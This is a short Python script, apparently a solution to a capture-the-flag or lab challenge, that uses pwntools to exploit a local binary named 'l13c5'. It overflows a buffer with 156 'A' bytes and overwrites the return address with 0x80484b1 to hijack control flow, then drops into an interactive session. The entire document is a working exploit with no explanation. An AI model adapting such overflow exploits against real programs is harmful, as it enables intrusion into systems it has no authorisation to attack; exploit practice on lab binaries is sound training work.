#!/usr/bin/env python

import pwn

io = pwn.process("./l13c5")

io.send(b"A" * 156 + pwn.p32(0x80484b1))

io.interactive()